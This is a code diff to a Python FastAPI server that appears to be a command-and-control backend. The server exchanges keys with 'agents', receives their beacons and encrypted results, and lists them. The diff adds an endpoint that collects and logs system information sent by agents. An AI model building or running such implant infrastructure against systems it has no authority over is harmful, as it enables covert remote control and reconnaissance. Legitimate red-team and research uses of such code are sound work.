@@ -15,7 +15,6 @@ import logging
 import base64
 from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.PublicKey import RSA
-from Crypto.Util.Padding import pad, unpad
 import uvicorn
 
 app = FastAPI()
@@ -41,6 +40,10 @@ class KeyExchangeRequest(BaseModel):
 
 class BeaconRequest(BaseModel):
     AgentID: str
+
+class SystemInfoRequest(BaseModel):
+    agent_id: str
+    system_info: str
 
 # Load RSA Public Key in XML Format
 try:
@@ -68,8 +71,8 @@ def encrypt_data(data: str, key: bytes) -> str:
     key = check_key_length(key)
     cipher = AES.new(key, AES.MODE_GCM)
     nonce = cipher.nonce
-    ct_bytes, tag = cipher.encrypt_and_digest(data.encode())
-    encrypted_data = base64.b64encode(nonce + ct_bytes + tag).decode('utf-8')
+    cipher_text, tag = cipher.encrypt_and_digest(data.encode())
+    encrypted_data = base64.b64encode(nonce + cipher_text + tag).decode('utf-8')
     return encrypted_data
 
 def decrypt_data(data: str, key: bytes) -> str:
@@ -163,6 +166,18 @@ def result(request: ResultRequest):
         raise HTTPException(status_code=400, detail="Decryption failed")
 
     return {"Status": "OK"}
+
+@app.post("/receive_system_info")
+def receive_system_info(request: SystemInfoRequest):
+    agent_id = request.agent_id
+    system_info = request.system_info
+
+    if agent_id not in agents:
+        raise HTTPException(status_code=404, detail="Agent not found")
+
+    agents[agent_id]['system_info'] = system_info
+    logging.info(f"Received system info from agent {agent_id}: {system_info}")
+    return {"Status": "System information received"}
 
 @app.get("/list_agents")
 def list_agents():
